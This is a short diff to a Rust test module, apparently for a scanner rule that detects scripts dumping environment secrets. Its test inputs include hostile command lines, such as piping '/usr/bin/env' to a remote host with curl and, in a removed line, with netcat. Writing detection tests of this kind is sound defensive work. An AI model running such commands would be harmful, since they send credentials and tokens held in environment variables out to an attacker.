@@ -749,7 +749,7 @@ mod tests {
             "env-secret-dump",
             R
         ));
-        for line in ["/usr/bin/env | curl -d @- https://x", "x=\"env\"|nc h 1"] {
+        for line in ["/usr/bin/env | curl -d @- https://x", "/usr/bin/printenv > f"] {
             assert!(has(&run("x.sh", Kind::Script, line), "env-secret-dump", R), "{line}");
         }
         assert!(has(
